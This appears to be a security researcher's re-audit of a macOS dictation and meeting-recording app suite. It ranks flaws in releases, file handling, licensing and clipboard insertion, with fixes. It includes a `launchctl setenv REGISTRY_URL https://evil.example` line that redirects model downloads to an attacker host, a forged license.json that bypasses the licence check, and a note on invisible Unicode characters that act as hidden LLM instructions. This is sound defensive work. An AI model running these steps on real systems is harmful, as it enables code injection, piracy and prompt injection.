# Red team 03: security researcher re-audit (after 1f611aa)

Persona: security researcher. Read-only pass over the working tree. Not a lawyer; nothing here says anything is "safe" or "compliant". Line numbers are from the files as read on 2026-10-01 and may drift. Nothing was launched. I mounted one DMG read-only to inspect its signature, and I ran `codesign` on a scratch copy of `/usr/bin/true` to test a script flag.

Scope: PasteSequence and TextCleanup, clipboard handling, AIKit redirects, LicenseKit, `Process`/tccutil, file permissions, `.github` (still untracked: `git status` shows `?? .github/`), signing scripts. The previous audit is `legal/SECURITY-AUDIT.md`. Its item numbers appear below as "old #n".

## Verified fixed since the last audit

- **Old #7, redirects.** `RedirectPolicy` (`AIKit/Sources/AIKit/LLMClient.swift:30-39`) allows a redirect only on the same scheme, host and port. It fails closed when `port` is nil on one side and explicit on the other. It is the delegate of the one session every `LLMClient` uses by default (`:50-56`). No other `URLSession` talks to a third party. The Gumroad session is ephemeral and never carries a provider key.
- **Old #3, non-JSON Gumroad reply.** `License.failure(in:)` now returns `.network` for an unreadable reply. Only `success:false` or a refund, chargeback or lost dispute counts as `.rejected`.
- **Old #2, dev signature pinning.** `scripts/package.sh:15` defaults `PIN_DR=0`. All four `build-app.sh` files pin the designated requirement only when `SIGN_ID=-` and `PIN_DR=1`. The `--timestamp --sign -` path used for releases works with an ad-hoc identity (tested on a scratch binary, rc=0).
- **Old #1, partly fixed.** `sanitizeForInsertion` strips C0/C1 controls and bidi overrides (`PasteSequence.swift:56-62`). It runs once, in `TextInserter.insert` (`:46`), before every path: paste, type and the no-Accessibility clipboard fallback. The terminal list is longer, and `keepLineBreaks` collapses model-added newlines (`TextCleanup.swift:50`). `ESC [ 2 0 1 ~` can no longer be forged, because ESC is gone.
- **`Process`.** The only use is `/usr/bin/tccutil reset <Accessibility|ScreenCapture> <Bundle.main id>` (`Humanity/Sources/Humanity/Permissions.swift:116-128`). The path and arguments are fixed and there is no shell.
- **Concealed pasteboard items.** A saved snapshot that contains `ConcealedType` or `TransientType` is never restored (`PasteSequence.swift:96`). Murmur's own writes carry `TransientType` and `AutoGeneratedType` (`TextInserter.swift:21-22`).
- **CI.** The actions are pinned to a SHA. `ci.yml` runs with `contents: read`, no secrets, and no `pull_request_target`. In `release.yml` the app name goes through a `case` allow-list and the version through a regex, and every expansion is quoted. I found no script injection from the tag name.

## Findings (ranked)

### 1. Lookalike or tampered DMG: nothing lets a user tell the real download from a fake
- **Scenario.** The repo is MIT and public. An attacker rebuilds it with a backdoor and posts "Humanity-1.0.0.dmg" on a mirror, a Reddit thread or a search ad. The installer text is the same copied 5-step "Open Anyway" sequence, which the legitimate project itself teaches (`README.md`, `release.yml:72-77`). The attacker's app holds whatever Camera, Mic, Accessibility and Screen Recording the user grants, and synthesizes input. Users have been trained to defeat Gatekeeper, and there is no notarization to tell the two builds apart.
- **Likelihood: M. Impact: H** for the affected users.
- **Mitigation.** The hardened runtime, per-release `.sha256` files (`package.sh:23`), and the README pointing at the Releases page. The `.sha256` sits in the same release as the DMG, so it only guards against corruption, not against account or mirror compromise.
- **Remaining risk.** The Gumroad page says the key is checked in-app, but the DMG itself is public and unsigned by any identity. Gumroad customers and GitHub visitors get different download paths.
- **Minimal fix.**
  - Notarize with a Developer ID (the long-term fix; it removes the Open Anyway step).
  - Until then, publish the SHA-256 on the Gumroad page and in `README.md` as well.
  - Add `actions/attest-build-provenance` to `release.yml` and tell users to run `gh attestation verify`.
  - Choose one canonical download URL and say so on the product page.
- **Flag for attorney:** the Gumroad copy tells buyers to bypass Gatekeeper. Ask whether the "no medical device / as-is" and security disclaimers cover that instruction.

### 2. Release workflow: tag on any commit, secrets reachable by any pusher, workflow not in the repo
- **Scenario A (untracked).** `.github/` is untracked, so the committed 1f611aa has no CI. `SECURITY.md:12` claims "Release builds come from GitHub Actions", but the shipped `dist/*-1.0.0.dmg` files were built locally. They are dated 00:05-00:07 and arm64 only. The Murmur DMG carries the `device.camera` entitlement, which `Murmur/scripts/build-app.sh:51` no longer grants. So the DMGs are stale relative to the scripts (finding 11).
- **Scenario B (tag trust).** `release.yml:9` triggers on any `murmur/v*` tag. A collaborator, a leaked write-scoped token or a compromised account can push a tag on any commit or branch. The workflow file taken from that commit runs with `SIGNING_P12` and `contents: write`. It can print the p12 password, or ship a build from an unreviewed branch under a trusted tag.
- **Scenario C (no gate).** The release job never runs `ci.yml`'s tests, and it does not check that the tagged commit is on `main`.
- **Likelihood: L-M. Impact: H** if the signing identity leaks. A leaked "Humanity Self-Signed" key lets an attacker produce builds that inherit existing TCC grants, because the designated requirement is then the certificate leaf.
- **Existing mitigation.** `permissions: contents: write` is declared at workflow level only. `cert.p12` is deleted after import (`:51`). The keychain is on an ephemeral hosted runner.
- **Fix.**
  - Commit `.github/` with the rest, and ship from CI or correct `SECURITY.md`.
  - Put the secrets in a GitHub Environment named `release` with required reviewers, and add `environment: release` to the job.
  - Add a first step that fails unless `git merge-base --is-ancestor "$GITHUB_SHA" origin/main` (needs `fetch-depth: 0`).
  - Protect `*/v*` tags with a tag ruleset.

### 3. `Meeting.recording.folder` is an absolute path read from JSON, then deleted recursively
- **Scenario.** `meeting.json` and `recording.json` store `folder` as a full URL (`MeetingRecorder.swift:11`, written by `Meeting.save`). `MeetingsView.reload()` loads every folder under `Humanity/Meetings` and trusts that value. `delete(_:)` then runs `removeItem(at: folder)` (`MeetingsView.swift:131-133`). A "meeting" folder shared as a zip ("here's the call recording"), restored from a bad backup, or planted by any same-user process can carry `"folder": "file:///Users/me/Documents"`. Clicking Delete removes that tree.
- **Likelihood: L. Impact: H** (irrecoverable user data).
- **Existing mitigation.** Titles don't affect folder names (the old audit's path-traversal check still holds). This delete path has no check, which is old #12, unfixed.
- **Fix.** In `Meeting.load(from:)` and `MeetingRecording.unprocessed`, overwrite `recording.folder` with the folder the JSON was actually loaded from. In `MeetingsView.delete`, refuse unless `folder.standardizedFileURL.deletingLastPathComponent() == MeetingRecording.defaultDirectory.standardizedFileURL`.

### 4. Recordings, voiceprints and licence are written with default permissions and plain deletes
- **Scenario.** No code sets `posixPermissions`, `0700`, a backup exclusion or file protection. The only `createDirectory` and `.atomic` writes are in `MeetingRecorder.swift:89`, `Meeting.swift:96`, `VoiceProfileStore.swift:188-192`, `Murmur/.../RecordingStore.swift:24-32`, `OculOS/.../Persistence.swift:76-120` and `License.swift:42-43`. Files get the process umask (typically 0644, directories 0755). Meeting audio (`mic.m4a`, `system.m4a`), 256-float voiceprints (`profiles.json`, and `diarization.centroids` inside every `meeting.json`) and gaze calibration are readable by any process running as the user. That includes any unsandboxed app that was given Full Disk Access. They may also be readable by other local accounts, depending on home-directory permissions. Time Machine backs them up.
- **Deletion.** Retention and "delete all data" use `FileManager.removeItem` (`VoiceProfileStore.swift:87`, `MeetingRecorder.swift:155`, `MeetingsView.swift:133`). On APFS that is not secure erase, and Time Machine and local snapshots keep the old copies.
- **Likelihood: M** (any user-level malware or a shared Mac). **Impact: M-H**, because voiceprints are biometric identifiers.
- **Remaining risk.** The retention promise (12 months unused, 3 years from consent, `VoiceProfile.swift:39-47`) cannot be met for backed-up copies.
- **Fix.**
  - After creating each support directory, set `[.posixPermissions: 0o700]`. Write the sensitive files with `0o600` (set attributes right after the atomic write).
  - Set `URLResourceValues.isExcludedFromBackup = true` on `Humanity/Meetings`, `Humanity/VoiceProfiles` and `Murmur/Recordings`.
  - State the backup caveat in `PRIVACY.md` retention text.
- **Flag for attorney:** whether BIPA/CUBI/Washington-style "destroy within X" duties are met when copies survive in backups, and whether the privacy policy should say so.

### 5. Model downloads honor `REGISTRY_URL` from the environment
- **Scenario.** FluidAudio's `ModelRegistry.baseURL` resolves programmatic override, then `REGISTRY_URL`, then `MODEL_REGISTRY_URL`, then Hugging Face (`.build/checkouts/FluidAudio/Sources/FluidAudio/ModelRegistry.swift:31-38`). Nothing in this repo sets the override, which was confirmed by grep. Same-user malware runs `launchctl setenv REGISTRY_URL https://evil.example` (or edits a LaunchAgent). On the next first-run model download, speaker-separation models come from the attacker's server and load into the TCC-privileged process. Core ML models are code-adjacent, not just data. A user-chosen corporate proxy variable has the same effect.
- **Likelihood: L. Impact: M-H.** This is old #15, still open.
- **Existing mitigation.** FluidAudio pins the model commit and fetches over HTTPS (per the earlier audit), but a changed host bypasses both.
- **Fix.** In MeetingKit and Murmur start-up, before any download, set `ModelRegistry.baseURL = "https://huggingface.co"` (the programmatic value wins over the environment). Optionally record the model file hashes.

### 6. Licence enforcement is honor-system, with a tamper and refund window the Gumroad copy doesn't reflect
- **Scenario A (tamper).** `license.json` is plain JSON that nobody signs. Write `{"key":"x","verifiedAt":<now+23h>,"termsVersion":"2026-10-01"}` and `isUnlocked` is true (`License.swift:47-52`). The future-date guard allows up to 24 hours ahead. `recheckIfDue` only fires when the age exceeds 7 days (`:132-135`), so the file stays good for 8 days of wall time, and the bypass can be repeated indefinitely. Even without editing, a fake key that is rejected while `api.gumroad.com` is blocked (a network error is treated as offline) lives for the 60-day `offlineGrace` (`:21`).
- **Scenario B (refund).** The recheck runs only inside `requireActivation` at launch (`ActivationWindow.swift:9-10`). A menu-bar app that runs for weeks never rechecks. A buyer who refunds inside the 30-day window keeps a working app until a relaunch more than 7 days after the last check, and for up to 60 days while offline.
- **Scenario C (reply forgery).** `failure(in:)` accepts any reply with `success:true` and a `purchase` object. A user with a local proxy trust can forge it. This is pointless for a pirate who can just flip `License.required`.
- **Likelihood: H** for a motivated user. **Impact: L** (about $5 per key, MIT source).
- **Existing mitigation.** The future-date check. TERMS and the product page already describe an honor model (check the wording).
- **Remaining risk.** The Gumroad copy says "a refunded key stops working", but the real delay is 7-60 days.
- **Minimal fix.** Rewrite that sentence to "stops working at the next license check (up to about a week after the app next launches)". Optionally call `recheckIfDue()` on a daily timer in each module. Do not add client DRM.
- **Flag for attorney:** the exact wording of "A refunded key stops working", and whether the 60-day offline grace should be disclosed in the Terms of Sale.

### 7. Sanitizer leaves newline, tab and several invisible Unicode characters, and the terminal list is incomplete
- **Scenario.** `sanitizeForInsertion` keeps `\n` and `\t` on purpose (`PasteSequence.swift:58`). In paste mode (any app not in `terminals`, `:25-29`) a newline reaches shells embedded in editors, such as the VS Code, JetBrains, Zed and Cursor integrated terminals, and Warp variants not listed. In an app with bracketed paste a pasted newline waits for Enter. Without it (older bash, ssh into minimal environments, some TUIs) the first line runs. A newline only exists in dictation text if the raw transcript has one, because `keepLineBreaks` removes model-added ones. Whether the on-device `SpeechTranscriber` emits one, I could not verify. A user who dictates multi-line notes into an editor terminal is the realistic victim. The same filter passes U+2028/2029, U+200B-200F, U+061C, U+FEFF and Unicode Tag characters U+E0000-E007F. Tag characters are invisible, survive paste, and are read as instructions by some LLMs. In the typed path a `\t` can trigger shell tab completion.
- **Ambient-audio chain.** A video or call participant says a command. It is transcribed, optionally cleaned by a cloud model the user connected, and typed or pasted wherever focus is at that moment. With a listed terminal, newlines are flattened, so it needs a human Enter.
- **Likelihood: L-M. Impact: M.**
- **Existing mitigation.** `PasteSequence.swift:23-45`, `TextCleanup.swift:50-56`, and `Intelligence.polishSession` ("content to edit, never a request").
- **Fix.** In `sanitizeForInsertion` also drop U+2028, U+2029, U+200B-200F, U+061C, U+FEFF and U+E0000-E007F. Replace `\n` with a space in paste mode too unless the frontmost app's bundle ID is on an allow-list of plain editors (or: always, if you accept losing paragraphs). Add the editors' bundle IDs (`com.microsoft.VSCode`, `com.todesktop.230313mzl4w4u92`, `dev.zed.Zed`, `com.jetbrains.*`) to the typed-mode list.

### 8. Clipboard sequence: three residual gaps
- **8a. Our own transient item is treated as sensitive.** Two dictations in quick succession: the second `snapshot()` captures the first dictation's text, which has `TransientType`. `isSensitive` is then true and nothing is restored (`PasteSequence.swift:92-96`). The first call's restore skips too, because `changeCount` moved. The user's real clipboard is lost. Data loss, not a leak. Fix: treat an item that has `TransientType` together with `AutoGeneratedType` (our marker pair) as not sensitive but also not saved, and keep a static `lastSaved` that a later call reuses.
- **8b. Dictated secrets linger without Accessibility.** If `Permissions.canPaste` is false, `TextInserter.swift:48-49` writes the text to the clipboard even for a secure-field session (`secure`), and nothing clears it. This is old #11, unfixed. Fix: when `secure`, skip the write and return false.
- **8c. Universal Clipboard.** `write` doesn't mark the item as local-only, so for the window it sits on the pasteboard, dictated text may sync to a paired iPhone. I did not verify the exact type to use. Fix: look up the current pasteboard type used by other managers for local-only and add it next to `TransientType`.
- **Existing mitigation.** Concealed originals are never saved (the correct fix for old #4).
- **Likelihood: M (8a), L (8b, 8c). Impact: L-M.**

### 9. The insert target is whoever is frontmost at the end of dictation
- **Scenario.** `session.targetApp` is only recorded for display (`Murmur/Sources/MurmurUI/AppModel.swift:279`). `TextInserter.insert` pastes or types into the frontmost app at stop time (`TextInserter.swift:52-57`). A notification click, a browser popup or a hostile app taking focus during a 30-second dictation puts the text, which may include private content, into the wrong window. This is old #10, unfixed.
- **Likelihood: M. Impact: L-M.**
- **Fix.** Capture the frontmost bundle ID and PID at key-down. At insert, if it differs, put the text on the clipboard only and show "Copied (focus changed)", the same fallback the missing-Accessibility case uses.

### 10. Signing and packaging scripts: smaller issues
- **Dev builds pin to the bundle ID.** `build-app.sh` run directly (and `make app`) defaults to `PIN_DR=1` when `SIGN_ID=-`. Anyone who follows the README to build locally gets a designated requirement that any ad-hoc app claiming `io.github.pikabrofar.humanity.*` satisfies, inheriting their grants. `SECURITY.md:16-17` discloses this. Fix: have `make app` print a one-line warning, or default `PIN_DR=0`.
- **Entitlements temp file.** `ENT="$(mktemp)"` is never removed (all four `build-app.sh`). Harmless but leaves files in `$TMPDIR`. Add `trap 'rm -f "$ENT"' EXIT`.
- **Stale artifacts.** `dist/` is gitignored and the DMGs predate the script edits (finding 2). The `Murmur-1.0.0.dmg` I inspected has `device.camera` plus `device.audio-input`, arm64 only, `designated => cdhash H"a7652a3e..."`. That is the right pin style (a plain ad-hoc signature), but rebuild before any listing goes live so the shipped entitlements match the scripts.
- **Unquoted `$SIGN` and `$ENT`** work today because `mktemp` paths have no spaces. Not exploitable.
- **CI cert import.** `SIGN_ID="Humanity Self-Signed"` is hardcoded in `release.yml:53`. If the p12's common name differs, `codesign` fails. That fails closed. `security create-keychain -p ci` is fine on a throwaway runner.
- **Likelihood: L. Impact: L.**

### 11. Ollama and provider residuals
- **Ollama on `http://localhost:11434`** carries no authentication. Any local process listening on that port gets transcripts the user routed to it (old #17). Likelihood L, impact M. Fix: show the same first-send consent line used for cloud providers (`MeetingsView.swift:101-106`) the first time Ollama is used, and say "any program on this Mac can listen on this port".
- **Redirect policy.** A same-host redirect keeps the `x-api-key` header. That is deliberate and needs no change. A provider that moves `/v1/messages` to a new host will now fail with a 3xx error instead of silently forwarding. Say so in `AIProvidersView` error text if support tickets appear.
- **Key redaction** (`LLMClient.swift:117`) only replaces the exact key string. A provider that echoes a truncated key won't be caught. Likelihood L, impact L.

### 12. Activation window reads the clipboard
- **Scenario.** `ActivationView.onAppear` reads `NSPasteboard.general.string` (`ActivationWindow.swift:88`) to prefill a copied key. On macOS 15.4+ that triggers a "paste from other apps" prompt. It reads whatever is copied, then extracts only a 4x8-hex pattern. It cannot leak a password, because it only keeps text that matches the key regex and never sends it off-device.
- **Likelihood: L. Impact: L.** Fix: none needed. If the prompt confuses buyers, add a visible "Paste key" button and drop the automatic read.

## Attack chains traced end to end

1. **Fake download.** Public repo, rebuild with a backdoor, mirror the DMG, copy the Open Anyway steps. The user grants Camera, Accessibility and Mic, and the attacker has input synthesis. (Finding 1; nothing in the code or release process distinguishes the real build.)
2. **Poisoned model host.** Same-user malware sets `REGISTRY_URL` through `launchctl`. The next model download pulls attacker models into the privileged process. (Finding 5.)
3. **Shared meeting folder.** A zip is unpacked into `Humanity/Meetings` with `folder` pointed at `~/Documents`. The user clicks Delete on "Q3 sync". (Finding 3.)
4. **Dictation to terminal.** Ambient audio becomes text, a newline survives in an unlisted editor terminal, and a command runs. (Finding 7; needs bracketed paste to be absent.)
5. **Licence bypass.** Hand-edit `verifiedAt`, or refund and keep running. (Finding 6; revenue only.)

## Not findings (checked, nothing to fix)

- **AppleScript, URL schemes, XPC, `NWListener`:** none. `tccutil` arguments cannot be influenced by any input.
- **`Package.resolved`:** present for Humanity, MeetingKit and Murmur (FluidAudio pinned at `21493f8dac5a97e65742e6ff26f42f164c2fda0f`). The other four packages have no remote dependencies.
- **`release.yml` injection:** none found. Notes are written with an unquoted heredoc, but `$app` and `$version` are validated first.
- **No secrets in the working tree** beyond the public Gumroad `productID`; I did not re-scan git history this pass.
